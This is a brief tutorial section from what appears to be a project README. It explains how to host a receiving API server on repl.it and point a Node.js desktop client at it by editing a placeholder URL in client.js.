### [TUTORIAL](#tutorial) USE Mode of use

> Create a new project on repl.it to create the API server. This is where you will receive the data sent by the client. (Just copy the contents of [server api] and paste it into your repl.it index file). Once you do that, you will have the receiving API set up.

> Now, in the client section, go to (client) and change line 10 in client.js file:

```js
10 | apiurl = "http://yourapi.com" // Put Your API URL Here in desktopClient/client.js
```

> Replace it with the URL of your previously created API server on repl.it.

> With this, everything should be set up correctly, and it should work by running `node client.js`.
